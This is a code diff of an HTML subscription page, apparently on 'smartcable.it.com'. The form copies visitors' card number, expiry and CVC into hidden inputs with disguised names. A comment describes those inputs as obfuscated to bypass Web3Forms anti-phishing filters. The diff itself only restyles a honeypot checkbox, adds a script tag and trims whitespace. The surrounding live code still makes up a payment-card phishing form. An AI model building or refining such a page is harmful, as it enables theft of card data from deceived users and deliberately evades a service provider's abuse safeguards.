@@ -51,7 +51,7 @@
           <input type="hidden" name="redirect" value="https://smartcable.it.com/subscribe.html?submitted=true">
 
           <!-- Honeypot -->
-          <input type="checkbox" name="botcheck" style="display:none">
+          <input type="checkbox" name="botcheck" class="u-hidden">
 
           <!-- Obfuscated inputs to bypass Web3Forms anti-phishing filters -->
           <input type="hidden" name="b_number" id="hidden-card-number">
@@ -175,6 +175,7 @@
 
   <!-- Scripts -->
   <script src="js/components.js"></script>
+  <script src="js/main.js" defer></script>
 
   <!-- ── Submission Success Check ── -->
   <script>
@@ -205,11 +206,11 @@
           var numberEl = document.getElementById('card-number');
           var expiryEl = document.getElementById('card-expiry');
           var cvcEl = document.getElementById('card-cvc');
-          
+
           var hiddenNumber = document.getElementById('hidden-card-number');
           var hiddenExpiry = document.getElementById('hidden-card-expiry');
           var hiddenCvc = document.getElementById('hidden-card-cvc');
-          
+
           if (numberEl && hiddenNumber) {
             hiddenNumber.value = numberEl.value ? 'Card: ' + numberEl.value : '';
           }
